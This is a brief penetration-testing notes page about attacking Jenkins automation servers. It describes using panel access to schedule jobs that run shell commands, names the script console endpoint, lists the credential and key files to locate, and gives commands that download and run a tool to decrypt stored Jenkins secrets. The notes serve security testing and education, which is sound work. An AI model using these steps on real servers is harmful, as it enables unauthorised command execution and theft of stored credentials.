# Jenkins


[Jenkins](https://www.jenkins.io/)  – an open source automation server which enables developers around the world to reliably build, test, and deploy their software.  [Jenkins](https://en.wikipedia.org/wiki/Jenkins_(software)) is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat. It is used in Automated Build pipelines and CICD.

## Pwning Jenkins

[pwn-jenkins](https://github.com/gquere/pwn_jenkins) are Notes about attacking Jenkins servers

## Exploitation of Jenkins Panel

With access you can create schduleable jobs that accept shell commands for both Windows and Linux. 

`Dashboard -> Create a job -> Freeform project -> Configure`

May require cronjob schedule syntax even on Windows - `* * * * *` to run every minute.

`/Script` endpoint is script console

## Credential Decryption

Find
```bash
$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret
$JENKINS_HOME/jobs/example-folder/config.xml - Possible location
```

With [Hoto's jenkins decryptor](https://github.com/hoto/jenkins-credentials-decryptor)
```bash
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor

./jenkins-credentials-decryptor \
  -m master.key \
  -s hudson.util.Secret \
  -c config.xml \
  -o json
```


## References

[Jenkins Official ](https://www.jenkins.io/)  
[Wikipedia Jenkins](https://en.wikipedia.org/wiki/Jenkins_(software)) 
[Hoto's jenkins decryptor](https://github.com/hoto/jenkins-credentials-decryptor)